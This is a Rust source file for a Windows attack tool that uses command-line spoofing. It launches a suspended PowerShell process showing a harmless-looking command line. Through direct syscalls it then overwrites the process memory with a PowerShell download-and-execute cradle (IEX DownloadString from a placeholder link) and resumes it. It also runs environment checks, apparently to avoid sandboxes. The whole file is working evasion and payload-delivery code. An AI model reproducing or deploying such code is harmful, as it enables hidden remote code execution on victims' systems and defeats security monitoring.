#![allow(non_snake_case)]
#![allow(unused_unsafe)]
mod syscalls;
use crate::syscalls::SYSCALLS;
use std::mem::{size_of, zeroed};
use std::ptr::null_mut;
use std::ffi::c_void;
use windows_sys::Win32::System::Threading::{
    CreateProcessW, PROCESS_INFORMATION, STARTUPINFOW, PEB, PROCESS_BASIC_INFORMATION,
    PROCESS_INFORMATION_CLASS, CREATE_NEW_CONSOLE, CREATE_SUSPENDED,
};
use windows_sys::Win32::Foundation::{UNICODE_STRING, NTSTATUS};
use windows_sys::Win32::Security::SECURITY_ATTRIBUTES;
mod power;
use power::run_all_checks;

fn to_wide_chars(s: &str) -> Vec<u16> {
    s.encode_utf16().collect()
}
fn pad_right(s: &str, total_width: usize, padding_char: u16) -> Vec<u16> {
    let mut wide = to_wide_chars(s);
    if wide.len() < total_width {
        wide.resize(total_width, padding_char);
    }
    wide
}

fn main() {
    if power::run_all_checks() {
        println!("Work!");
    }
    let malicious_command = r#"powershell.exe -ExecutionPolicy Bypass -Command "IEX (New-Object Net.WebClient).DownloadString('REPLACE_ME_WITH_RAW_LINK')""#;
    let malicious_command_wide = to_wide_chars(&malicious_command);

    let spoofed_command_str = "powershell.exe";
    let mut spoofed_command_wide = pad_right(spoofed_command_str, malicious_command.len(), ' ' as u16);
    spoofed_command_wide.push(0);

    let mut si: STARTUPINFOW = unsafe { zeroed() };
    si.cb = size_of::<STARTUPINFOW>() as u32;
    let mut sa: SECURITY_ATTRIBUTES = unsafe { zeroed() };
    sa.nLength = size_of::<SECURITY_ATTRIBUTES>() as u32;
    let mut pi: PROCESS_INFORMATION = unsafe { zeroed() };

    let mut current_dir = to_wide_chars("C:\\windows\\");
    current_dir.push(0);

    let success = unsafe {
        CreateProcessW(
            null_mut(),
            spoofed_command_wide.as_mut_ptr(),
            &mut sa,
            &mut sa,
            0,
            CREATE_SUSPENDED | CREATE_NEW_CONSOLE,
            null_mut(),
            current_dir.as_ptr(),
            &mut si,
            &mut pi,
        )
    };
	
    if success == 0 {
        return;
    }
	
    let mut pbi: PROCESS_BASIC_INFORMATION = unsafe { zeroed() };
    let mut return_length: u32 = 0;

    let status: NTSTATUS =
        (SYSCALLS.NtQueryInformationProcess)(
            pi.hProcess as *mut c_void,
            0 as PROCESS_INFORMATION_CLASS,
            &mut pbi as *mut _ as *mut c_void,
            size_of::<PROCESS_BASIC_INFORMATION>() as u32,
            &mut return_length
        );

    if status != 0 {
        unsafe {
            let _ = (SYSCALLS.NtClose)(pi.hProcess as *mut c_void);
            let _ = (SYSCALLS.NtClose)(pi.hThread as *mut c_void);
        }
        return;
    }

    let mut peb: PEB = unsafe { zeroed() };
    let mut bytes_read: usize = 0;

    let status = unsafe {
        (SYSCALLS.NtReadVirtualMemory)(
            pi.hProcess as *mut c_void,
            pbi.PebBaseAddress as *mut c_void,
            &mut peb as *mut _ as *mut c_void,
            size_of::<PEB>(),
            &mut bytes_read
        )
    };

    if status != 0 || bytes_read != size_of::<PEB>() {
        unsafe {
            let _ = (SYSCALLS.NtClose)(pi.hProcess as *mut c_void);
            let _ = (SYSCALLS.NtClose)(pi.hThread as *mut c_void);
        }
        return;
    }

    #[repr(C)]
    struct Params {
        _filler: [u8; 0x70],
        CommandLine: UNICODE_STRING,
    }
    let mut proc_params: Params = unsafe { zeroed() };
    let status = unsafe {
        (SYSCALLS.NtReadVirtualMemory)(
            pi.hProcess as *mut c_void,
            peb.ProcessParameters as *mut c_void,
            &mut proc_params as *mut _ as *mut c_void,
            size_of::<Params>(),
            &mut bytes_read
        )
    };

    if status != 0 || bytes_read != size_of::<Params>() {
        unsafe {
            let _ = (SYSCALLS.NtClose)(pi.hProcess as *mut c_void);
            let _ = (SYSCALLS.NtClose)(pi.hThread as *mut c_void);
        }
        return;
    }

    let mut bytes_written: usize = 0;
    let status = unsafe {
        (SYSCALLS.NtWriteVirtualMemory)(
            pi.hProcess as *mut c_void,
            proc_params.CommandLine.Buffer as *mut c_void,
            malicious_command_wide.as_ptr() as *mut c_void,
            malicious_command_wide.len() * 2,
            &mut bytes_written
        )
    };

    if status != 0 {
        unsafe {
            let _ = (SYSCALLS.NtClose)(pi.hProcess as *mut c_void);
            let _ = (SYSCALLS.NtClose)(pi.hThread as *mut c_void);
        }
        return;
    }

    let cmd_line_len = (spoofed_command_str.len() * 2) as u16;

    let status = unsafe {
        let len_address = (peb.ProcessParameters as *mut u8).add(0x70);
        (SYSCALLS.NtWriteVirtualMemory)(
            pi.hProcess as *mut c_void,
            len_address as *mut c_void,
            &cmd_line_len as *const _ as *mut c_void,
            size_of::<u16>(),
            &mut bytes_written
        )
    };

    if status != 0 {
        unsafe {
            let _ = (SYSCALLS.NtClose)(pi.hProcess as *mut c_void);
            let _ = (SYSCALLS.NtClose)(pi.hThread as *mut c_void);
        }
        return;
    }

    unsafe {
        let mut suspend_count: u32 = 0;
        let _ = (SYSCALLS.NtResumeThread)(pi.hThread as *mut c_void, &mut suspend_count);
        let _ = (SYSCALLS.NtClose)(pi.hProcess as *mut c_void);
        let _ = (SYSCALLS.NtClose)(pi.hThread as *mut c_void);
    }
}
